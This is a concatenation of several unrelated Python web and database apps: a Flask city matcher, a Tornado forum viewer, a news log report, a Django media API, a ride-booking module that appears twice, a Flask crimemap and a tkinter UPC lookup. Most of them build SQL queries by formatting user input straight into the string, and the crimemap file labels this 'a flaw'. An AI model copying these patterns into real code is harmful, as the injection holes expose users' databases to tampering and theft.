    job2 = request.args.get('job2', None, type=str)
    df = model.get_cities(job1, job2)#, weights, jobs_table, cities_table, db)
    df = df.reset_index()#df = df[output].head(n_cities)
    cities = []
    for i in range(n_cities):
        cities.append({i: (df.ix[i, 'city'],
                           df.ix[i, 'latitude'], df.ix[i, 'longitude'],
                           df.ix[i, 'image_url'], df.ix[i, 'description'])})
    print cities
    return json.dumps(cities)
    #return cities.to_json(orient='split')#json.dumps(list(cities))#address)

def jobs(table=JOBS_TABLE):
    """Return list of projects."""
    query = 'select job from %s group by job' %table
    df = model.sql.frame_query(query, db)                    
    return json.dumps(df.job.values.tolist())

# I have a dictionary that holds functions
# that respond to json requests
JSON = {
    'jobs': jobs,
    'job1': jobs,
    'job2': jobs
}

# jobs function is called here
@app.route("/json/<what>")
def ajson(what):

    return JSON[what]()

@app.route('/<pagename>')
def regularpage(pagename=None):
    """
    Route not found by the other routes above. May point to a static template.
    """
    return "You've arrived at " + pagename
    #if pagename==None:
    #    raise Exception, 'page_not_found'
    #return render_template(pagename)

if __name__ == '__main__':
    print "Starting debugging server."
    app.run(debug=True, host='localhost', port=8000)

#!/usr/bin/env python

import MySQLdb
import tornado.httpserver
import tornado.web
import os.path
import json
import tornado.escape

"""
Ideally each endpoint will work for JSON and HTML.  JSON first
"""

root_url = "undefined"
server_port = 0



class Application(tornado.web.Application):
	def __init__(self):
		global root_url, server_port		
		config_file = open("config.json").read()
		config_data = json.loads(config_file)
		root_url = config_data["server"]
		server_port = config_data["port"]

		handlers = [
			(r"/main", MainHandler),
			(r"/count", CountHandler),
			(r"/", tornado.web.RedirectHandler, dict(url=r"/main")),
			(r"/([a-z]+)", DatabaseHandler),
			(r"/([a-z]+)/([0-9]+)",ForumHandler),
			(r"/([a-z]+)/([0-9]+)/([0-9]+)",ThreadHandler), 
		]
		settings = dict(
			template_path=os.path.join(os.path.dirname(__file__), "templates"),
		)
		super(Application, self).__init__(handlers, **settings)
		self.db = MySQLdb.connect(db=config_data["database"], 
						user=config_data["user"],
						passwd=config_data["passwd"])

		self.databases = config_data["databases"] 

	
"""  Ideally, we should be able to have each give direct json or wrap in html"""
class HandlerBase(tornado.web.RequestHandler):
	
	def prefix(self, name):
		for d in self.application.databases:
			if d["url"] == name:
				return d["data_prefix"]
		self.setstatus(404)	
		return ""

	def username(self, user_id):
		c = self.application.db.cursor()
		c.execute("SELECT pn_uname FROM pn_users WHERE pn_uid=%s", (user_id,))
		row = c.fetchone()
		if row:
			return row[0].decode('latin1').encode('utf8')
		else:
			return "Unknown"	

	def write_json_or_html(self, json_data):
		if("text/html" in self.request.headers["accept"]):
			self.write_html(json_data)	
		else:
			self.write(json_data)

	def write_html(self, json_data):
		#subclass this method!
		pass
	
class MainHandler(HandlerBase):
	def get(self):
		out = dict()
		dbs = []
		for d in self.application.databases:
			dbs.append({"name":d["name"], "url":root_url + d["url"]})
		out["databases"] = dbs
		self.write_json_or_html(out)
	
	def write_html(self, json_data):
		self.render("dblist.html", dbs=json_data["databases"])



class DatabaseHandler(HandlerBase):
	def get(self, db):
		prefix = self.prefix(db)
		if prefix:
			c = self.application.db.cursor()
			c.execute("SELECT forum_id, forum_name, forum_desc FROM %s_forums" % prefix)
			out = {}
			forum_list = []
			for row in c.fetchall():
				forum_name = row[1].decode('latin1').encode('utf8')
				forum_desc = row[2].decode('latin1').encode('utf8')
				forum_list.append({"name":forum_name, "description":forum_desc,"url":root_url+db+"/"+str(row[0])})
			out["forums"] = forum_list
			self.write_json_or_html(out)
        
        def write_html(self, json_data):
		self.render("database.html", forums=json_data["forums"])	


class ForumHandler(HandlerBase):
	def get(self, db, forum_id):
		prefix = self.prefix(db)
		if prefix:
			out = {}
			thread_list = []
			c = self.application.db.cursor()
			select_table = "SELECT forum_id, topic_title, topic_id, topic_poster FROM %s" % prefix + "_topics"
			select_text = select_table + " WHERE forum_id=%s ORDER BY topic_id"
			c.execute(select_text, (forum_id,))
			for row in c.fetchall():
				title = row[1].decode('latin1').encode('utf8')
				thread_list.append({"title":title, "creator":self.username(row[2]),  "url":root_url+db+"/"+forum_id+"/"+str(row[2])})
			out["threads"] = thread_list
                        self.write_json_or_html(out)

        def write_html(self, json_data):
		self.render("forum.html", threads=json_data["threads"])


class ThreadHandler(HandlerBase):
	def get(self, db, forum_id, topic_id):
		prefix = self.prefix(db)
		if prefix:
			out = {}
			post_list = []
			c = self.application.db.cursor()
			
			select_table_one = prefix + "_posts"
			select_table_two = prefix + "_posts_text"
			
			select_tables = "SELECT %s.post_id, poster_id, post_subject, post_text FROM %s" % (select_table_one, select_table_one)
			select_join = " INNER JOIN %s ON %s.post_id=%s.post_id" % (select_table_two, select_table_one, select_table_two)
			select_where = " WHERE topic_id=%s ORDER BY post_id"                    
			select_statement = select_tables + select_join + select_where
			c.execute(select_statement, (topic_id,))                    
			for row in c.fetchall():
				subject = row[2].decode('latin1').encode('utf8')
				text = row[3].decode('latin1').encode('utf8')
				post_list.append({"subject":subject, "text":text,"poster":self.username(row[1]), "url":root_url+db+"/"+forum_id+"/"+topic_id+"/"+str(row[0])})
                        self.write_json_or_html({"posts":post_list})

        def write_html(self, json_data):
		self.render("thread.html", posts=json_data["posts"])
	


class CountHandler(tornado.web.RequestHandler):
	def get(self):
		c = self.application.db.cursor()
		c.execute("SELECT COUNT(*) FROM classic_posts")
		self.render("count.html", count=c.fetchone())


def main():
	http_server = tornado.httpserver.HTTPServer(Application())
	http_server.listen(server_port)
	tornado.ioloop.IOLoop.current().start()

if __name__ == "__main__":
	main()



#!/usr/bin/env python2
import psycopg2
from datetime import datetime


def connect():
    """Connect to the PostgreSQL database news.  Returns a database
    connection."""
    return psycopg2.connect("dbname=news")                    


def reportTopArticles(amount):
    """Reports the top articles by visitors from the logs table.

    Args:
          amount: the number of rankings to return
    """
    query = "SELECT * FROM toparticles " \
            "ORDER BY hits DESC " \
            "LIMIT {0}".format(amount)                    
    c.execute(query)                    
    rows = c.fetchall()                    

    response = "    Top {0} Articles by Views\n"  \                    
               "-----------------------------\n".format(amount)
    responseFooter = ""

    for r in rows:
        responseFooter += "\"" + str(r[0]) + "\" -- " + str(r[1]) + " views\n"

    response += responseFooter
    print response
    return response


def reportTopAuthors():                    
    """Reports the top authors by visitors added for each of their articles.
    """
    query = "SELECT * FROM authorsrank"
    c.execute(query)                    
    rows = c.fetchall()                    

    response = "Author Rank by Article Views\n"  \
               "-----------------------------\n"
    responseFooter = ""

    for r in rows:
        responseFooter += str(r[0]) + " -- " + str(r[1]) + " views\n"

    response += responseFooter
    print response
    return response


def reportDailyErrors(x):
    """Reports the dates in which the logged errors exceed x percent that day
    out of all logged visits.

    Args:
          x: the percentage of errors reported
    """

    query = "SELECT * from dailyerrors " \
            "WHERE " \
            "cast(errorcount as decimal) / cast(hitcount as decimal) * 100 >= {0}" \                    
            .format(x)                    
    c.execute(query)                    
    rows = c.fetchall()                    

    response = "Dates With More Than {0}% Error Rate\n" \
               "-----------------------------\n".format(x)                    

    responseFooter = ""



    for r in rows:
        # date_object = datetime.strptime(r[0], '%m/%d/%Y')
        date_object = r[0].strftime('%B %d, %Y')
        responseFooter += str(date_object) + " - " + str(r[1]) + " errors\n"

    response += responseFooter
    print response
    return response


# And here we go...
# Connect to the database
DB = connect()                    
c = DB.cursor()                    

# Method queries
reportTopArticles(3)                    
reportTopAuthors()                    
reportDailyErrors(1)                    

from os import path
from datetime import datetime
import json

from rest_framework import status
from rest_framework.decorators import api_view, renderer_classes
from rest_framework.response import Response
from rest_framework.renderers import UnicodeJSONRenderer, BrowsableAPIRenderer
from sorl.thumbnail import get_thumbnail

from django.http import HttpResponseRedirect, HttpResponse
from django.contrib.auth.models import User
from django.db.models import Q
from django.core.context_processors import csrf
from django.template import Template, RequestContext

from media.models import Media, generate_UUID
from tag.models import Tag
from media.serializers import MediaSerializer
from media.models import getTypeChoices, getFormatChoices
from bbx.settings import DEFAULT_MUCUA, DEFAULT_REPOSITORY
from bbx.utils import logger
from mucua.models import Mucua
from repository.models import Repository

redirect_base_url = "/api/"  # TODO: tirar / mover


@api_view(['GET'])
def media_list(request, repository, mucua, args=None, format=None):
    """
    List all medias, or search by terms
    """

    if request.method == 'GET':
        """
        list medias
        """

        # pegando sessao por url
        redirect_page = False

        # REPOSITORIO: verifica se existe no banco, senao pega a default
        if mucua == 'rede':
            # get actual mucua for excluding it
            this_mucua = Mucua.objects.get(description=DEFAULT_MUCUA)
        else:                    
            try:
                mucua = Mucua.objects.get(description=mucua)
            except Mucua.DoesNotExist:
                mucua = Mucua.objects.get(description=DEFAULT_MUCUA)
                redirect_page = True

        try:
            repository = Repository.objects.get(name=repository)
        except Repository.DoesNotExist:
            repository = Repository.objects.get(name=DEFAULT_REPOSITORY)
            redirect_page = True

        # redirect
        if redirect_page:
            return HttpResponseRedirect(redirect_base_url + repository.name +
                                        '/' + mucua.description +
                                        '/bbx/search/')

        """
        ====================
        SEARCH ENGINE
        
        -------------
        Sample urls
        
        Valid with the following types of url (TODO: create tests):
        
        [repository]/[mucua]/search/video/quilombo/limit/5
        [repository]/[mucua]/search/orderby/note/limit/10
        [repository]/[mucua]/search/video/quilombo/orderby/title/limit/5
        [repository]/[mucua]/search/video/quilombo/orderby/type/desc/name/asc/limit/5
        [repository]/[mucua]/search/video/quilombo/orderby/author/desc

        TODO: still failling when receives incomplete urls. i.e.:
        [repository]/[mucua]/search/video/quilombo/orderby/title/limit/5
        """
        
        """  if passed, get limiting rules """

        """ TODO: move default_limit to configurable place """
        default_limit = 20
        if (args.find('limit') != -1):
            limiting_str = int(args.split('limit/')[1])                    
            args = args.split('limit/')[0]
        else:                    
            limiting_str = default_limit                    
        
        """ if passed, get ordering rules """
        ordering_str = ''                    
        if (args.find('orderby/') != -1):
            ordering_terms = args.split('orderby/')[1].split('/')
            ordering_list = []
            counting = 0
            for term in ordering_terms:
                if ((term == 'asc') | (term == 'desc')):
                    if counting == 0:
                        continue
                    ordering_list[-1] += ' ' + term + ' '
                else:                    
                    if (term != ''):
                        ordering_list.append(term)                               
                counting += 1
        
            ordering_str = ','.join(ordering_list)                    
            
            args = args.split('orderby/')[0]
        else:                    
            ordering_str = 'm.name'                    
        
        """ compose query string for terms """
        term_str = ""                    
        args = args.rstrip('/')
        if args != '':
            term_index = 0
            for term in args.split('/'):
                term = str(term)                    
                if (term in [key for (key, type_choice) in getTypeChoices() if
                            term == type_choice]):
                    term_str += ' type LIKE "%' + term + '%"'                    
                elif term in [key for
                             (key, format_choice) in getFormatChoices() if
                             term == format_choice]:
                    term_str += ' format LIKE "%' + term + '"%"'                    
                else:                    
                    if (term_index > 0):
                        term_str += 'AND'                     
                    
                    term_str += '( t.name LIKE "%' + term + '%"'                    
                    term_str += ' OR m.name LIKE "%' + term + '%"'                    
                    term_str += ' OR m.note LIKE "%' + term + '%")'                    
                    term_index += 1
                    
                    
        if (len(term_str) > 0):                    
            term_str = ' AND (' + term_str + ')'                    
        
        """ exclude the content of own mucua on the network                    
        TODO: maybe create also an option for including or not the own mucua data """                    
        if (mucua == 'rede'):                    
            origin_str = "origin_id!=" + str(this_mucua.id)                    
        else:                    
            origin_str = "origin_id=" + str(mucua.id)                    
        
        sql ='SELECT DISTINCT m.* FROM media_media m LEFT JOIN media_media_tags mt ON m.id = mt.media_id LEFT JOIN tag_tag t ON mt.tag_id = t.id  WHERE (%s AND repository_id = %d) %s ORDER BY %s LIMIT %s' % (origin_str, repository.id, term_str, ordering_str, limiting_str)                    
        
        medias = Media.objects.raw(sql)                    
        
        """ sql log
        logger.info('sql: ' + sql)
        """
        
        # serializa e da saida
        serializer = MediaSerializer(medias, many=True)
        return Response(serializer.data)


@api_view(['GET', 'PUT', 'DELETE', 'POST'])
def media_detail(request, repository, mucua, pk=None, format=None):
    """
    Retrieve, create, update or delete a media instance.
    """

    # pegando sessao por url
    redirect_page = False

    try:
        mucua = Mucua.objects.get(description=mucua)
    except Mucua.DoesNotExist:
        mucua = Mucua.objects.get(description=DEFAULT_MUCUA)
        redirect_page = True

    try:
        repository = Repository.objects.get(name=repository)
    except Repository.DoesNotExist:
        repository = Repository.objects.get(name=DEFAULT_REPOSITORY)
        redirect_page = True

    # redirect
    if redirect_page:
        return HttpResponseRedirect(redirect_base_url + repository.name +
                                    '/' + mucua.description + '/media/')
    author = request.user

    if pk:
        try:
            media = Media.objects.get(uuid=pk)
        except Media.DoesNotExist:
            return Response(status=status.HTTP_404_NOT_FOUND)

    if request.method == 'GET':
        if pk == '':
            # acessa para inicializar tela de publicaocao de conteudo / gera
            # token
            c = RequestContext(request, {'autoescape': False})
            c.update(csrf(request))
            t = Template('{ "csrftoken": "{{ csrf_token  }}" }')
            return HttpResponse(t.render(c), mimetype=u'application/json')

        if pk != '':
            serializer = MediaSerializer(media)
            return Response(serializer.data)

    elif request.method == 'PUT':
        if pk == '':
            return HttpResponseRedirect(
                redirect_base_url + repository.name + '/' +
                mucua.description + '/bbx/search')
        media.name = request.DATA['name']
        media.note = request.DATA['note']
        media.type = request.DATA['type']
        media.license = request.DATA['license']
        media.date = request.DATA['date']

        media.save()
        if media.id:
            tags = request.DATA['tags'].split(',')
            media.tags.clear()
            for tag in tags:
                if tag:
                    try:
                        tag = tag.strip()
                        tag = Tag.objects.get(name=tag)
                    except Tag.DoesNotExist:
                        tag = Tag.objects.create(name=tag)
                        # TODO: case or proximity check to avoid spelling
                        # errors? Or do people handle this by manual merging &
                        # deletion of tags?
                        tag.save()

                    media.tags.add(tag)

            return Response("updated media - OK",
                            status=status.HTTP_201_CREATED)
        else:                    
            return Response("error while creating media",
                            status=status.HTTP_400_BAD_REQUEST)

        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data)
        else:                    
            return Response(serializer.errors,
                            status=status.HTTP_400_BAD_REQUEST)

    elif request.method == 'POST':
        """
        create a new media
        """
        if request.DATA['author'] != '':
            author = request.DATA['author']
        else:                    
            author = request.user

        try:
            author = User.objects.get(username=author)
        except User.DoesNotExist:
            author = User.objects.get(username=request.user)

        media = Media(repository=repository,
                      origin=mucua,
                      author=author,
                      name=request.DATA['name'],
                      note=request.DATA['note'],
                      type=request.DATA['type'],
                      format=request.FILES['media_file'].name.split('.')[1].lower(),
                      license=request.DATA['license'],
                      date=(request.DATA['date'] if request.DATA['date'] !=
                            '' else datetime.now()),
                      media_file=request.FILES['media_file'],
                      uuid=generate_UUID()
                      )

        media.save()
        if media.id:
            # get tags by list or separated by ','
            tags = (request.DATA['tags'] if iter(request.DATA['tags'])
                    else request.DATA['tags'].split(','))
            for tag_name in tags:
                try:
                    if tag_name.find(':') > 0:
                        args = tag.split(':')
                        tag_name = args[1]
                    tag = Tag.objects.get(name=tag_name)
                except Tag.DoesNotExist:
                    tag = Tag.objects.create(name=tag_name)
                    tag.save()

                media.tags.add(tag)

            media.save()  # salva de novo para chamar o post_save
            serializer = MediaSerializer(media)
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        else:                    
            return Response("error while creating media",
                            status=status.HTTP_400_BAD_REQUEST)

    elif request.method == 'DELETE':

        media.delete()

        return Response(status=status.HTTP_204_NO_CONTENT)


@api_view(['GET'])
def media_last(request, repository, mucua, qtd=5):
    """
    List the last added medias
    """
    try:
        mucua = Mucua.objects.get(description=mucua)
    except Mucua.DoesNotExist:
        mucua = Mucua.objects.get(description=DEFAULT_MUCUA)

    try:
        repository = Repository.objects.get(name=repository)
    except Repository.DoesNotExist:
        repository = Repository.objects.get(name=DEFAULT_REPOSITORY)

    medias = Media.objects.filter(
        repository=repository.id
    ).filter(origin=mucua.id).order_by('-date')[:qtd]
    # serializa e da saida
    serializer = MediaSerializer(medias, many=True)
    return Response(serializer.data)


@api_view(['GET'])
def media_by_mocambola(request, repository, mucua, username, qtd=5):
    if mucua != 'all':
        try:
            mucua = Mucua.objects.get(description=mucua)
        except Mucua.DoesNotExist:
            mucua = Mucua.objects.get(description=DEFAULT_MUCUA)
            redirect_page = True

    try:
        repository = Repository.objects.get(name=repository)
    except Repository.DoesNotExist:
        repository = Repository.objects.get(name=DEFAULT_REPOSITORY)

    try:
        author = User.objects.get(username=username)
    except User.DoesNotExist:
        print 'user not exists'

    if mucua != 'all':
        medias = Media.objects.filter(
            repository=repository.id
            ).filter(origin=mucua.id).filter(
            author=author.id).order_by('-date')[:qtd]
    else:                    
        medias = Media.objects.filter(
            repository=repository.id
            ).filter(author=author.id).order_by('-date')[:qtd]

    # serializa e da saida
    serializer = MediaSerializer(medias, many=True)
    return Response(serializer.data)


@api_view(['GET'])
def show_image(request, repository, mucua, uuid, width, height, format_type):

    try:
        media = Media.objects.get(uuid=uuid)
    except Media.DoesNotExist:
        return Response(status=status.HTTP_404_NOT_FOUND)

    print media.media_file
    image = get_thumbnail(media.media_file, str(width) + 'x' + str(height),
                          crop='center', quality=99)

    print path.join(image.url)
    return Response(True)


@api_view(['GET'])
def media_url(request, repository, mucua, uuid):

    try:
        media = Media.objects.get(uuid=uuid)
    except Media.DoesNotExist:
        return Response(status=status.HTTP_404_NOT_FOUND)

    return Response(media.get_url())


@api_view(['GET'])
@renderer_classes((UnicodeJSONRenderer, BrowsableAPIRenderer))
def media_where_is(request, repository, mucua, uuid):
    
    try:
        media = Media.objects.get(uuid=uuid)
    except Media.DoesNotExist:
        return Response(status=status.HTTP_404_NOT_FOUND)
    io = media.where_is()
    data = json.loads(io)
    return Response(data)

import sqlite3

class Error(Exception):
    pass
class InvalidRNOError(Error):
    pass
class InvalidMemberError(Error):
    pass
class InvalidLocationError(Error):
    pass


class BookRides:
    def __init__(self, cursor):
        self.cursor = cursor
        self.rides = []
    def find_rides(self, driver):
        query = '''                    
        SELECT r.rno, r.price, r.rdate, r.seats, r.lugDesc, r.src, r.dst, r.driver, r.cno, r.seats-COUNT(b.bno) 
        FROM rides r, bookings b
        WHERE driver = '{driver}'                    
        AND r.rno = b.bno 
        GROUP BY r.rno, r.price, r.rdate, r.seats, r.lugDesc, r.src, r.dst, r.driver, r.cno
        '''.format(driver = driver)                    

        self.cursor.execute(query)                    
        self.rides = self.cursor.fetchall()

    def display_rides(self, page_num):
        page = self.rides[page_num*5: min(page_num*5+5, len(self.rides))]
        for ride in page:
            print(str(ride[0]) + '.', end='')
            print(ride)
        if (page_num*5+5 < len(self.rides)):
            user_input = input("To book a member on a ride, please enter 'b'. To see more rides, please enter 'y'. To exit, press 'e': ")
            if (user_input == 'y'):
                self.display_rides(page_num+1)
        else:
            user_input = input("To book a member on a ride, please enter 'b'. To exit, press 'e': ")
            if (user_input == 'b'):
                self.book_ride()
            else:
                pass
             

    # def find_seats_remaining(self, rno):
    #     query = '''                    
    #     SELECT r.seats-COUNT(b.bno) FROM rides r, bookings b 
    #     WHERE r.rno = {rno}
    #     AND b.rno = {rno}
    #     '''.format(rno = rno)

    #     self.cursor.execute(query)                    
    #     rows = self.cursor.fetchone()
    #     return int(rows[0])

    def generate_bno(self):
        query = "SELECT MAX(bno) FROM bookings"
        self.cursor.execute(query)                    
        max_bno = self.cursor.fetchone()
        return int(max_bno[0])+1

    def verify_email(self, member):
        query = "SELECT COUNT(email) FROM members WHERE email = '{email}'".format(email = member)                    
        self.cursor.execute(query)                    
        result = self.cursor.fetchone()
        if (int(result[0]) > 0):
            return True 
        else:
            return False

    def verify_rno(self, rno):
        query = "SELECT COUNT(rno) FROM rides WHERE rno = {rno}".format(rno = rno)                    
        self.cursor.execute(query)                    
        result = self.cursor.fetchone()
        if (int(result[0]) > 0):
            return True 
        else:
            return False
    
    def verify_location(self, location):
        return True 
    
    def book_ride(self):

        try:
            rno = input("Please enter a rno: ")
            
            if (not self.verify_rno(rno)):
                raise InvalidRNOError

            member = input("Please enter the email of the member you want to book on the ride: ")

            if (not self.verify_email(member)):
                raise InvalidMemberError

            pickup = input("Please enter pick up location code: ")
            dropoff = input("Please enter pick up location code: ")

            if (not self.verify_location(pickup) or not self.verify_location(dropoff)):
                raise InvalidLocationError

            if (not self.verify_email(member)):
                raise InvalidMemberError

            cost = input("Please enter the cost for ride: ")

            seats = input("Please enter the number of seats for ride: ")

            #if (int(seats) > self.rides[rno]

            #get unique booking number
            bno = self.generate_bno()
            

            query = '''INSERT INTO bookings VALUES ({bno}, {member}, {rno}, {cost}, {seats}, {pickup}, {dropoff})                    
                    '''.format(bno = bno, member = member, rno = rno, cost = cost, seats = seats, pickup = pickup, dropoff = dropoff)
            
            print(query)

        except InvalidRNOError:
            print("Please enter a valid rno") 
            self.display_rides(1)
        except InvalidMemberError:
            print("Please enter a valid member email")
            self.display_rides(1)
        except InvalidLocationError:
            print("Please enter a valid pickup and dropoff location code")
            self.display_rides(1)

    
    


import sqlite3

class Error(Exception):
    pass
class InvalidRNOError(Error):
    pass
class InvalidMemberError(Error):
    pass
class InvalidLocationError(Error):
    pass


class BookRides:
    def __init__(self, cursor):
        self.cursor = cursor
        self.rides = []
    def find_rides(self, driver):
        query = '''                    
        SELECT r.rno, r.price, r.rdate, r.seats, r.lugDesc, r.src, r.dst, r.driver, r.cno, r.seats-COUNT(b.bno) 
        FROM rides r, bookings b
        WHERE driver = '{driver}'                    
        AND r.rno = b.bno 
        GROUP BY r.rno, r.price, r.rdate, r.seats, r.lugDesc, r.src, r.dst, r.driver, r.cno
        '''.format(driver = driver)                    

        self.cursor.execute(query)                    
        self.rides = self.cursor.fetchall()

    def display_rides(self, page_num):
        page = self.rides[page_num*5: min(page_num*5+5, len(self.rides))]
        for ride in page:
            print(str(ride[0]) + '.', end='')
            print(ride)
        if (page_num*5+5 < len(self.rides)):
            user_input = input("To book a member on a ride, please enter 'b'. To see more rides, please enter 'y'. To exit, press 'e': ")
            if (user_input == 'y'):
                self.display_rides(page_num+1)
        else:
            user_input = input("To book a member on a ride, please enter 'b'. To exit, press 'e': ")
            if (user_input == 'b'):
                self.book_ride()
            else:
                pass
             

    # def find_seats_remaining(self, rno):
    #     query = '''                    
    #     SELECT r.seats-COUNT(b.bno) FROM rides r, bookings b 
    #     WHERE r.rno = {rno}
    #     AND b.rno = {rno}
    #     '''.format(rno = rno)

    #     self.cursor.execute(query)                    
    #     rows = self.cursor.fetchone()
    #     return int(rows[0])

    def generate_bno(self):
        query = "SELECT MAX(bno) FROM bookings"
        self.cursor.execute(query)                    
        max_bno = self.cursor.fetchone()
        return int(max_bno[0])+1

    def verify_email(self, member):
        query = "SELECT COUNT(email) FROM members WHERE email = '{email}'".format(email = member)                    
        self.cursor.execute(query)                    
        result = self.cursor.fetchone()
        if (int(result[0]) > 0):
            return True 
        else:
            return False

    def verify_rno(self, rno):
        query = "SELECT COUNT(rno) FROM rides WHERE rno = {rno}".format(rno = rno)                    
        self.cursor.execute(query)                    
        result = self.cursor.fetchone()
        if (int(result[0]) > 0):
            return True 
        else:
            return False
    
    def verify_location(self, location):
        return True 
    
    def book_ride(self):

        try:
            rno = input("Please enter a rno: ")
            
            if (not self.verify_rno(rno)):
                raise InvalidRNOError

            member = input("Please enter the email of the member you want to book on the ride: ")

            if (not self.verify_email(member)):
                raise InvalidMemberError

            pickup = input("Please enter pick up location code: ")
            dropoff = input("Please enter pick up location code: ")

            if (not self.verify_location(pickup) or not self.verify_location(dropoff)):
                raise InvalidLocationError

            if (not self.verify_email(member)):
                raise InvalidMemberError

            cost = input("Please enter the cost for ride: ")

            seats = input("Please enter the number of seats for ride: ")

            #if (int(seats) > self.rides[rno]

            #get unique booking number
            bno = self.generate_bno()
            

            query = '''INSERT INTO bookings VALUES ({bno}, {member}, {rno}, {cost}, {seats}, {pickup}, {dropoff})                    
                    '''.format(bno = bno, member = member, rno = rno, cost = cost, seats = seats, pickup = pickup, dropoff = dropoff)
            
            print(query)

        except InvalidRNOError:
            print("Please enter a valid rno") 
            self.display_rides(1)
        except InvalidMemberError:
            print("Please enter a valid member email")
            self.display_rides(1)
        except InvalidLocationError:
            print("Please enter a valid pickup and dropoff location code")
            self.display_rides(1)

    
    


from crimemap.dbhelper import DBHelper
from flask import Flask, render_template, request

app = Flask(__name__)
DB = DBHelper()


@app.route('/')
def home():
    try:
        data = DB.get_all_inputs()
    except Exception as e:
        print (e)                    
        data = None
    return render_template("home.html", data=data)


@app.route("/add", methods=["POST"])
def add():
    try:
        data = request.form.get("userinput")
        DB.add_input(data)
    except Exception as e:
        print (e)                    

    return home()


@app.route("/clear")
def clear():
    try:
        DB.clear_all()
    except Exception as e:
        print (e)                    

    return home()


if __name__ == '__main__':
    app.run()

import pymysql
import dbconfig


class DBHelper:

    def connect(self,database="crimemap"):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self,data):
        connection = self.connect()
        try:
            # The following is a flaw
            query = "INSERT INTO crimes(description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()



import sqlite3 as sql

class DB_Connector:

	def __init__(self, *args, **kwargs):                    

		self.dbStr = "../Databases/Product.db"                    
		self.table_name = 'products'
		self.id_column  = 'id'
		self.column_2   = 'upc'
		self.column_3   = 'name'
		self.column_4   = 'image'
		self.some_upc = ""
		self.result = ""

	
	def fetch_product(self):

		conn = sql.connect(self.dbStr)

		c = conn.cursor()

		c.execute("SELECT * FROM {tn} WHERE {upc}={my_upc}".\                    
	        format(tn=self.table_name, cn=self.column_2,                     
	        	upc=self.column_2, my_upc=self.some_upc))                    
		
		result = c.fetchone()

		return result

import sys
import tkinter as tk
import Controller as dbc
from PIL import Image, ImageTk
from tkinter import font


class RaspiTelxon(tk.Tk):
	
	def __init__(self):
		
		#initialize root object
		tk.Tk.__init__(self)

		self.title("Raspi-Telxon")
		
		self.titleFont = font.Font(family='Helvetica', size=24)
		self.itemFont = font.Font(family='Helvetica', size=18)

		# Self is this instance of Tk IE:- "root"
		container = tk.Frame(self)

		container.pack(side="top", fill="both", expand=True)
		container.grid_rowconfigure(0, weight=1)
		container.grid_columnconfigure(0, weight=1)

		# dispatch_dict = {"SearchPage" : SearchPage}
		# self.dispatch_dict = dispatch_dict
		
		self.frames = {}
		self.result = ""
		self.container = container

		for F in (StartPage, SearchPage):
			
			frame = F(container, self)

			#print(F.__name__)

			self.frames[F] = frame

			#print(self.frames)

			frame.grid(row=0, column=0, sticky="nsew")

		self.show_frame(StartPage)


	def create_frame(self, F):                    

		new_frame = SearchPage(self.container, self)                    

		self.frames[SearchPage] = new_frame                    

		new_frame.grid(row=0, column=0, sticky="nsew")                    

		self.show_frame(new_frame)                    
		

	def remove_frame(self, frame):                    
		
		print("remove_frame: " + str(frame))

		self.frames.pop(frame, None)                    

	def show_frame(self, cont):

		frame = self.frames[cont]
		
		frame.tkraise()

	# Just break out the for on line 23 into a function
	# Reduce duplicate code
	def custom_frame(self):
		
		result_frame = ResultsPage(self.container, self)
		
		self.frames[ResultsPage] = result_frame
		
		result_frame.grid(row=0, column=0, sticky="nsew")
		
		self.show_frame(ResultsPage)

	def set_result(self, result):
		self.result = result

	def get_result(self):
		return self.result


class StartPage(tk.Frame):

	def __init__(self, parent, controller):

		tk.Frame.__init__(self, parent)

		label = tk.Label(self, text = "Login Page", font=controller.titleFont)
		label.pack(pady=10, padx=10)

		enterAppButton = tk.Button(self, text="Start Using Raspi-Telxon!", 
			font=controller.itemFont,command=lambda: controller.show_frame(SearchPage))

		enterAppButton.pack(pady=5)

		exitAppButton = tk.Button(self, text="Quit", 
			font=controller.itemFont, command=lambda: sys.exit(0))

		exitAppButton.pack(pady=5)

class SearchPage(tk.Frame):

	def __init__(self, parent, controller):

		tk.Frame.__init__(self, parent)

		self.controller = controller

		statusbar = tk.Frame(self)
		statusbar.pack(side="top", fill="x")
		self.statusbar = statusbar

		navbar = tk.Frame(self)
		navbar.pack(side="bottom", fill="x")
		self.navbar = navbar

		UPC_Label = tk.Label(self, text="UPC", font=controller.titleFont)
		UPC_Label.pack(pady=10, padx=10, anchor="center")

		self.UPC_Entry = tk.Entry(self)
		self.UPC_Entry.pack(pady=10, padx=10, anchor="center")

		backButton = tk.Button(navbar, text="Back",
			font=controller.itemFont, command=lambda: controller.show_frame(StartPage))
		backButton.pack(side="left", pady=10, padx=10)

		Search_Button = tk.Button(navbar, text="Search", 
															font=controller.itemFont, command=self.search)
		Search_Button.pack(side="left", pady=10, padx=10)

		exitAppButton = tk.Button(navbar, text="Quit", 
			font=controller.itemFont, command=lambda: sys.exit(0))
		exitAppButton.pack(side="left", pady=10, padx=10)

		# temp = self.winfo_children()
		# print(temp)


	def search(self):                    
		
		upc = ""

		upcEntry = self.UPC_Entry.get()                    

		if(upcEntry == ""):                    
			emptyInputLabel = tk.Label(self.statusbar, text="UPC Cannot Be Empty", fg="red")                    
			emptyInputLabel.pack()                    

		if(self.UPC_Entry.get() != ""):                    

			self.View_Result_Button = tk.Button(self.navbar, text="View Result",                     
				font=self.controller.itemFont, command=lambda: self.controller.custom_frame())                    

			self.View_Result_Button.pack(side="left", pady=10, padx=10)                    

			upc = self.UPC_Entry.get()                    

			database = dbc.DB_Connector()

			database.some_upc = upc

			result = database.fetch_product()
		
			self.controller.set_result(result)

			if(result is None):
				result_not_found = tk.Label(self, text="No Result Found!", font=self.controller.itemFont)                    
				result_not_found.pack()                    
				self.View_Result_Button.config(state='disabled')                    
			elif(result is not None):
				result_found_notification = tk.Label(self, text="Results Found!", font=self.controller.itemFont)                    
				result_found_notification.pack()                    
